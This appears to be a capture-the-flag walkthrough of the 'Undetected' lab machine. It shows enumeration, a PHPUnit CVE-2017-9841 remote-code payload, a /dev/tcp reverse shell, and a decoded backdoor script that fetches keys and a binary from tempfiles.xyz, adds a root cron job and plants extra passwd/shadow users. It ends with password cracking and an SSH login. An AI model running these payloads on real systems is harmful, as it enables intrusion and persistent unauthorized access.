# Undetected

# Enumeration

````
$ nmap -sCV -p22,80 --max-rate 7000 10.10.11.146 -oA nmap-10.10.11.146-sCV
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-28 08:01 EDT
Nmap scan report for 10.10.11.146
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
| ssh-hostkey: 
|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)
|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)
|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Diana's Jewelry
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.67 seconds
````

````
10.10.11.146 djewelry.htb store.djewelry.htb
````

````
wfuzz -u 'http://store.djewelry.htb/FUZZ' -w /root/Downloads/subdomains-top1million-110000.txt --hw 314
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://store.djewelry.htb/FUZZ
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000000053:   301        9 L      28 W       325 Ch      "images"                                                                                    
000000406:   301        9 L      28 W       322 Ch      "css"                                                                                       
000000454:   301        9 L      28 W       321 Ch      "js"                                                                                        
000002329:   301        9 L      28 W       325 Ch      "vendor"  
````

````
GET /vendor/ HTTP/1.1
Host: store.djewelry.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1


````

/vendor
````
Index of /vendor
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	autoload.php	2021-07-04 20:40 	178 	 
[DIR]	bin/	2022-02-08 19:59 	- 	 
[DIR]	composer/	2022-02-08 19:59 	- 	 
[DIR]	doctrine/	2022-02-08 19:59 	- 	 
[DIR]	myclabs/	2022-02-08 19:59 	- 	 
[DIR]	phpdocumentor/	2022-02-08 19:59 	- 	 
[DIR]	phpspec/	2022-02-08 19:59 	- 	 
[DIR]	phpunit/	2022-02-08 19:59 	- 	 
[DIR]	sebastian/	2022-02-08 19:59 	- 	 
[DIR]	symfony/	2022-02-08 19:59 	- 	 
[DIR]	webmozart/	2022-02-08 19:59 	- 	 
````

/vendor/phpunit
````
[TXT]	ChangeLog-5.6.md	2016-10-25 07:40 	1.9K
````

phpunit 5.6.2
````
### Changed

* Deprecated `PHPUnit\Framework\TestCase::setExpectedExceptionRegExp()`
* `PHPUnit_Util_Printer` no longer optionally cleans up HTML output using `ext/tidy`

[5.6.2]: https://github.com/sebastianbergmann/phpunit/compare/5.6.1...5.6.2
[5.6.1]: https://github.com/sebastianbergmann/phpunit/compare/5.6.0...5.6.1
[5.6.0]: https://github.com/sebastianbergmann/phpunit/compare/5.5...5.6.0
````

:new: [CVE-2017-9841](https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/README.md)

POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
````php
<?=phpinfo()?>;
````

````php
<?php system("whoami")?>
````

````
HTTP/1.1 200 OK
Date: Mon, 28 Mar 2022 12:33:46 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 9
Connection: close
Content-Type: text/html; charset=UTF-8

www-data
````

# User

````php
<?php system('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.15.6/1337 0<&1"')?>
````

````
nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.15.6] from (UNKNOWN) [10.10.11.146] 52334
bash: cannot set terminal process group (867): Inappropriate ioctl for device
bash: no job control in this shell
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
````

````
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$  grep 'bash' /etc/passwd
root:x:0:0:root:/root:/bin/bash
steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash
steven1:x:1000:1000:,,,:/home/steven:/bin/bash
````

> LinPEAS

> LinEnum

````
══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                 
/var/backups/info
````

/var/backups/info
````
 bind(AF_PACKET)[-] sendto(SOCK_RAW)[-] socket(SOCK_RAW)[-] socket(SOCK_DGRAM)[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)[-] klogctl(SYSLOG_ACTION_READ_ALL)Freeing SMP[-] substring '%s' not found in dmesg
ffff/bin/bash-c776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b[-] fork()/etc/shadow[.] checking if we got root[-] something went wrong =([+] got r00t ^_^[-] unshare(CLONE_NEWUSER)deny/proc/self/setgroups[-] write_file(/proc/self/set_groups)0 %d 1
/proc/self/uid_map[-] write_file(/proc/self/uid_map)/proc/self/gid_map[-] write_file(/proc/self/gid_map)[-] sched_setaffinity()/sbin/ifconfig lo up[-] system(/sbin/ifconfig lo up)[.] starting[.] namespace sandbox set up[.] KASLR bypass enabled, getting kernel addr[.] done, kernel text:   %lx
[.] commit_creds:        %lx
[.] prepare_kernel_cred: %lx
[.] native_write_cr4:    %lx
[.] padding heap[.] done, heap is padded[.] SMEP & SMAP bypass enabled, turning them off[.] done, SMEP & SMAP should be off now[.] executing get root payload %p
[.] done, should be root now
````

````
776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b
````

````
>>> bytearray.fromhex("776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b").decode()
'wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" \'$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}\' /etc/passwd; awk -F":" \'$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}\' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;'
````

````
john --wordlist=/root/rockyou.txt passwd-blah 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
ihatehackers     (?)     
1g 0:00:00:54 DONE (2022-03-29 06:26) 0.01847g/s 1645p/s 1645c/s 1645C/s iloveyoudaddy..halo03
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
````
:new: ihatehackers

````
$ ssh steven1@10.10.11.146
The authenticity of host '10.10.11.146 (10.10.11.146)' can't be established.
ED25519 key fingerprint is SHA256:nlNVR+zv5C+jYiWJYQ8BwBjs3pDuXfYSUK17IcTTvTs.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.146' (ED25519) to the list of known hosts.
steven1@10.10.11.146's password: 
steven@production:~$ id
uid=1000(steven) gid=1000(steven) groups=1000(steven)
````



# Root

# Secrets
